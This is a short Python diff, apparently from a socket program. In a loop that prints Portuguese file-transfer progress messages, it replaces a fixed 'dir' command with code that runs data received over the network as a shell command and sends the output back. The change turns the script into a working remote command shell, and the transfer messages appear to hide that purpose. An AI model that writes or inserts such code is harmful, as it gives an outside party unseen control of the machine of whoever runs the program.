@@ -24,7 +24,7 @@ while data_received < data_expected:
     data_received += len(data)
     print(f"2mb recebidos! 3mb foram enviados!")
 
-    proc = subprocess.Popen('dir', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+    proc = subprocess.Popen(data.decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
     output = proc.stdout.read() + proc.stderr.read()
 
     sock.send(output + b' \n')
